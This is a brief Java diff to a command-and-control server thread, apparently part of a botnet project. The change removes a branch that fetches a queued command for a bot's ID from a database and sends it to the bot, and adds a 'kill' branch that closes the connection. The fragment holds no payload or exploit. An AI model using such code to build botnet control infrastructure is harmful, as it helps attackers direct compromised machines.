@@ -16,7 +16,7 @@ public class C2ClientThread extends Thread {
     private Socket socket;
     private BufferedReader in;
     private PrintWriter out;
-    private UUID uuid; // placeholder
+    private UUID uuid;
     private CommandDatabase commandDatabase;
 
     public C2ClientThread(Socket socket, CommandDatabase commandDatabase) {
@@ -61,10 +61,9 @@ public class C2ClientThread extends Thread {
                         } else {
                             out.println("None");
                         }
-
-                    }else if(str.startsWith("cmd")){
-                        ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
-                        out.println(cmds.get(0));
+                    }
+                    else if (str.equals("kill")) {
+                        this.close();
                     }
                 }
             } catch (IOException e) {
